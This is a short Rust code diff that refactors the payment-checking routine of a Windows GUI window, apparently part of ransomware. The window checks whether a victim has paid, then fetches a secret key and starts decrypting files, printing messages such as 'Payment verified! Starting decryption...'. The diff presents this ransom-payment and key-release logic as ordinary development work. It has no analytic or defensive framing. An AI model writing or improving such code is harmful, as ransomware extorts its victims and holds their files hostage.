@@ -1,7 +1,6 @@
 use native_windows_gui as nwg;
 use native_windows_derive::NwgUi;
 use nwg::NativeUi;
-use std::sync::{Arc, Mutex};
 use std::rc::Rc;
 use std::cell::RefCell;
 use sodiumoxide::crypto::box_::PublicKey;
@@ -73,12 +72,18 @@ impl PaymentWindow {
             let pk_clone = pk.clone();
             
             tokio::spawn(async move {
-                match check_payment(&pk_clone).await {
-                    Ok(has_paid) => {
-                        if has_paid {
-                            println!("Good. Oof. Payment verified! Starting decryption...");
-                            
-                            match get_key(&pk_clone).await {
+                let has_paid = match check_payment(&pk_clone).await {
+                    Ok(paid) => paid,
+                    Err(e) => {
+                        println!("Failed to check payment status: {}", e);
+                        return;
+                    }
+                };
+                
+                if has_paid {
+                    println!("Good. Oof. Payment verified! Starting decryption...");
+                    
+                    match get_key(&pk_clone).await {
                                 Ok(secret_key) => {
                                     println!("Starting file decryption process...");
                                     
@@ -101,13 +106,8 @@ impl PaymentWindow {
                                     println!("Oops. Error getting decryption key: {}", e);
                                 },
                             }
-                        } else {
-                            println!("Hmm... Payment not confirmed yet. Try again in a moment.");
-                        }
-                    },
-                    Err(e) => {
-                        println!("Failed to check payment status: {}", e);
-                    },
+                } else {
+                    println!("Hmm... Payment not confirmed yet. Try again in a moment.");
                 }
             });
             
